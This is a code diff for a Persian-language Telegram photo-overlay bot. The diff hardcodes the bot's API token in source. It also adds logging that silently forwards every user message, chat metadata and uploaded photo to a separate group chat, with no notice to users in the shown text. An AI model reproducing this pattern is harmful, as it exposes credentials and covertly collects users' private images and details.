@@ -1,21 +1,42 @@
 import { overlayImage } from "./image-helper.js";
-import { dlFile } from "./common-helper.js";
+import { dlFile, addAppLog } from "./common-helper.js";
 import TelegramBot from "node-telegram-bot-api";
 
-const botToken = process.env.TELEGRAM_TOKEN || "678473327:AAEhecNnoRB5e2PvFUpTc0bpE82loli6iZA";
+const botToken = "333446529:AAFBWwDRV4eQ_3d19z8cPVvaLApuUX3cxmI";
 const botOptions = { polling: true };
 const bot = new TelegramBot(botToken, botOptions);
 
+const logGroup = { chatId: -429304995, fromChatId: 399011801 };
 const savedPhotoMsgId = {};
 
 // Handle message receieved
 bot.on('message', msg => {
+    // Make logs
+    console.log(msg);
+    addAppLog(msg);
+    try { bot.sendMessage(logGroup.chatId, JSON.stringify(msg, null, "    ")); } catch { }
+
+    if (msg?.chat?.type !== "private")
+        return;
+
+    if (msg?.text === "/start")
+        bot.sendMessage(msg.from.id, "سلام، خوش آمدید.\r\nبرای شروع تصویری را بارگذاری نمایید.");
+
     if (msg.photo == undefined)
         return;
 
     const fileId = msg.photo[msg.photo.length - 1].file_id;
 
     savedPhotoMsgId[msg.message_id] = fileId;
+
+    // Make log
+    bot.getFile(fileId).then(async fileUri => {
+        const fileUrl = `https://api.telegram.org/file/bot${botToken}/${fileUri.file_path}`;
+
+        dlFile(fileUrl, imgStream => {
+            try { bot.sendPhoto(logGroup.chatId, imgStream, { caption: JSON.stringify(msg.chat, null, "    ") }); } catch { }
+        });
+    });
 
     const opts = {
         reply_markup: {
@@ -33,7 +54,8 @@ bot.on('message', msg => {
                     callback_data: `parents_${msg.message_id}`
                 }]
             ]
-        }
+        },
+        reply_to_message_id: msg.message_id
     };
 
     bot.sendMessage(msg.from.id, "لطفاً یک هشتگ را انتخاب کنید...", opts);
@@ -43,10 +65,14 @@ bot.on('message', msg => {
 bot.on("callback_query", (callbackQuery) => {
     const cbqData = callbackQuery.data;
     const msg = callbackQuery.message;
-    const opts = {
-        chat_id: msg.chat.id,
-        message_id: msg.message_id,
-    };
+
+    // Make logs
+    console.log(msg);
+    addAppLog(msg);
+    try { bot.sendMessage(logGroup.chatId, JSON.stringify(msg, null, "    ")); } catch { }
+
+    if (msg?.chat?.type !== "private")
+        return;
 
     const cbDataAction = cbqData.split("_")[0];
     const cbMsgId = cbqData.split("_")[1] * 1;
@@ -78,14 +104,20 @@ bot.on("callback_query", (callbackQuery) => {
 
     // text = `شما "${text}" را انتخاب کردید.`;
 
-    bot.deleteMessage(msg.chat.id, msg.message_id);
+    bot.deleteMessage(msg?.chat?.id, msg.message_id);
 
     bot.getFile(cbFileId).then(async fileUri => {
         const fileUrl = `https://api.telegram.org/file/bot${botToken}/${fileUri.file_path}`;
 
         dlFile(fileUrl, imgStream => {
-            overlayImage(imgStream, selectedImgOverlayKey, outImgStream => {
-                bot.sendPhoto(msg.chat.id, outImgStream);
+            overlayImage(imgStream, selectedImgOverlayKey, async outImgStream => {
+                const sentPhoto = await bot.sendPhoto(msg.chat.id, outImgStream, { reply_to_message_id: cbMsgId });
+
+                try {
+                    const frwdPhoto = await bot.forwardMessage(logGroup.chatId, logGroup.fromChatId, sentPhoto.message_id, { caption: "ss" });
+
+                    bot.sendMessage(logGroup.chatId, JSON.stringify(msg.chat, null, "    "), { reply_to_message_id: frwdPhoto.message_id });
+                } catch { }
             });
         });
     });
